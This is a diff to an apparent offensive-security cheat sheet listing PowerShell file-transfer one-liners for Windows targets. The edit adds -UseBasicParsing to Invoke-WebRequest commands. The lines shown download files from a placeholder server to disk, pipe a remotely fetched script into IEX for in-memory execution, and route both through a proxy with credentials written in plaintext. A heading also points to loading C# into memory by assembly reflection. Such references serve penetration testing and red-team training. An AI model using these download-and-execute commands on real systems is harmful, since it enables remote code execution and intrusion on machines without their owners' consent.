@@ -16,12 +16,12 @@ $w=New-Object System.Net.WebClient; $w.Proxy=New-Object System.Net.WebProxy("htt
 
 ## file transfert - download on disk (powershell)
 ```powershell
-Invoke-WebRequest -URI http://<server>/<source_file> -Out <windows_writable_path>\<dest_file>
+Invoke-WebRequest -UseBasicParsing -URI http://<server>/<source_file> -Out <windows_writable_path>\<dest_file>
 ```
 
 ## file transfert - proxied download on disk (powershell)
 ```powershell
-Invoke-WebRequest -URI http://<server>/<source_file> -Out <windows_writable_path>/<dest_file> -Proxy http://<proxy_server>:<proxy_port> -ProxyCredential (New-Object System.Management.Automation.PSCredential("<proxy_login>", (ConvertTo-SecureString '<proxy_password>' -Asplaintext -force)))
+Invoke-WebRequest -UseBasicParsing  -URI http://<server>/<source_file> -Out <windows_writable_path>/<dest_file> -Proxy http://<proxy_server>:<proxy_port> -ProxyCredential (New-Object System.Management.Automation.PSCredential("<proxy_login>", (ConvertTo-SecureString '<proxy_password>' -Asplaintext -force)))
 ```
 
 ## file transfert - download and import script (csharp)
@@ -36,12 +36,12 @@ $w=New-Object System.Net.WebClient; $w.Proxy=New-Object System.Net.WebProxy("htt
 
 ## file transfert - download and import script (powershell)
 ```powershell
-Invoke-WebRequest -URI http://<server>/<script> | IEX
+Invoke-WebRequest -UseBasicParsing -URI http://<server>/<script> | IEX
 ```
 
 ## file transfert - proxied download and import script (powershell)
 ```powershell
-Invoke-WebRequest -URI http://<server>/<script> -Proxy http://<proxy_server>:<proxy_port> -ProxyCredential (New-Object System.Management.Automation.PSCredential("<proxy_login>", (ConvertTo-SecureString '<proxy_password>' -Asplaintext -force))) | IEX
+Invoke-WebRequest -UseBasicParsing -URI http://<server>/<script> -Proxy http://<proxy_server>:<proxy_port> -ProxyCredential (New-Object System.Management.Automation.PSCredential("<proxy_login>", (ConvertTo-SecureString '<proxy_password>' -Asplaintext -force))) | IEX
 ```
 
 ## file transfert - download csharp into memory (Assembly reflection)
